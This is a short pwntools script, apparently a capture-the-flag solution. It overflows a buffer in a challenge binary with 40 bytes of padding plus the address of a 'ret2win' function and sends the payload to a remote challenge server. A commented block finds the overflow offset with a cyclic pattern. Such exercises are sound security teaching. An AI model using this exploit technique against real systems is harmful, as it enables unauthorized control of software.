from pwn import *

elf = context.binary = ELF('D:/Tools/z_hnadout/chall')   #get the binary
info("TARGET : %#x", elf.symbols.ret2win) #print the location of ret2win

# io = process(elf.path) #start the binary
io = remote("15.206.207.160", 32075)
# io = remote("192.168.0.207", 9999)
ret2win = p32(elf.symbols.ret2win)
payload = b"a"*40+ret2win
io.recvuntil("Input")
io.sendline(payload)
print(io.recvall())

io.close()

# from pwn import *
# io = process('./chall')
# print(io.recvregex(b':')) # read until we get the prompt
# io.sendline(cyclic(500))
# io.wait()
# core = io.corefile
# stack = core.rsp
# info("rsp = %#x", stack)
# pattern = core.read(stack, 4)
# rip_offset = cyclic_find(pattern)
# info("rip offset is %d", rip_offset)
